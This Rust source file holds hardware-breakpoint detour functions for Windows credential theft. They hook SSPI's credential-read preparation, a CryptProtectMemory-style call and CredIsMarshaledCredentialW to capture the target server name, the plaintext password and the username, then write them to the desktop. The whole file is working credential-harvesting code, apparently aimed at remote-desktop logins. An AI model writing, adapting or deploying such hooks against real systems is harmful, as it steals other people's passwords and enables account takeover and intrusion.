use std::{ptr, slice};
use std::sync::Mutex;
use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
use hwbp::CallArgs;
use crate::{G_SERVER_NAME, G_TEMP_PASSWORD, G_USERNAME};

/// Detour callback for SSPI's preparation routine that exposes the target server name.
///
/// This function is intended to be installed as an `extern "system"` detour for
/// the SSPI prepare/credential-read flow. It reads the `PCWSTR` target name
/// from the intercepted function arguments and stores a copy in the global
/// `G_SERVER_NAME` (a `OnceCell<Mutex<Vec<u16>>>` in the crate).
pub unsafe extern "system" fn sspi_prepare_for_cred_read_detour(ctx: *mut CONTEXT) {
    // Build a CallArgs wrapper from the CPU context (safe wrapper around raw ctx).
    let mut args = unsafe { CallArgs::new(ctx) };

    // Argument 2 is expected to be a PCWSTR (pointer to u16 wide string).
    let psz_target_name = unsafe { args.get_ptr::<u16>(2) as *const u16 };

    // Copy the null-terminated PCWSTR into an owned Vec<u16>.
    // Use crate::utils::wcslen to measure length (preserves C semantics).
    let len = crate::utils::wcslen(psz_target_name);
    let slice = unsafe { slice::from_raw_parts(psz_target_name, len) };

    // Store the UTF-16 code units into the global server name buffer.
    // get_or_init ensures the OnceCell is initialized; Mutex guards concurrency.
    let lock = G_SERVER_NAME.get_or_init(|| Mutex::new(Vec::new()));
    if let Ok(mut v) = lock.lock() {
        v.clear();
        v.extend_from_slice(slice);
    }

    // Resume original execution path.
    unsafe { args.continue_execution() };
}

/// Detour for `CryptProtectMemory`-like usage that captures an embedded password.
///
/// The hooked code layout expected here:
/// - `pDataIn` is a pointer where the first DWORD describes a structure/flags,
///   and the password bytes are located at `((DWORD*)pDataIn) + 1`.
/// - `cbDataIn` is the size in bytes.
///
/// When the first DWORD is greater than `0x2`, the detour copies `cbDataIn`
/// bytes starting at the computed password address into `G_TEMP_PASSWORD`.
pub unsafe extern "system" fn crypt_protect_memory_detour(ctx: *mut CONTEXT) {
    let mut args = unsafe { CallArgs::new(ctx) };

    // Get parameters from the intercepted call.
    let p_data_in = unsafe { args.get_ptr::<u8>(1) };
    let cb_data_in = unsafe { args.get(2) as usize };

    // Compute pointer to the password area: ((DWORD*)pDataIn) + 1
    let p_dword = p_data_in as *const u32;
    let lp_password_addr = unsafe { p_dword.add(1) } as *const u8;

    // Read the first DWORD to decide whether password copying should occur.
    let first_dword = unsafe { ptr::read(p_dword) };
    if first_dword > 0x2 {
        // Form a slice over the password bytes and copy into the global buffer.
        let src = unsafe { slice::from_raw_parts(lp_password_addr, cb_data_in) };

        let lock = G_TEMP_PASSWORD.get_or_init(|| Mutex::new(Vec::new()));
        if let Ok(mut buf) = lock.lock() {
            buf.clear();
            buf.extend_from_slice(src);
        }
    }

    // Continue normal execution.
    unsafe { args.continue_execution() };
}

/// Detour for `CredIsMarshaledCredentialW` (or similar) that extracts a username.
///
/// Reads a `PCWSTR` marshaled credential pointer from argument index 1. If the
/// UTF-16 length is greater than zero, stores a UTF-16 copy in `G_USERNAME`
/// and invokes `crate::write_credentials_to_desktop()` to persist results.
pub unsafe extern "system" fn cred_is_marshaled_credentialw_detour(ctx: *mut CONTEXT) {
    if ctx.is_null() {
        return;
    }
    let mut args = unsafe { CallArgs::new(ctx) };

    // Argument 1 is expected to be a PCWSTR to the marshaled credential.
    let marshaled_credential = unsafe { args.get_ptr::<u16>(1) as *const u16 };

    // Measure first so we only write when length > 0 (keeps exact C semantics).
    let len = crate::utils::wcslen(marshaled_credential);
    if len > 0 {
        // Copy the UTF-16 code units into the global username buffer.
        let slice = unsafe { slice::from_raw_parts(marshaled_credential, len) };
        let lock = G_USERNAME.get_or_init(|| Mutex::new(Vec::new()));
        if let Ok(mut v) = lock.lock() {
            v.clear();
            v.extend_from_slice(slice);
        }
        // Persist captured credentials to the desktop (crate-level helper).
        let _ = crate::write_credentials_to_desktop();
    }

    // Continue the original function.
    unsafe { args.continue_execution() };
}
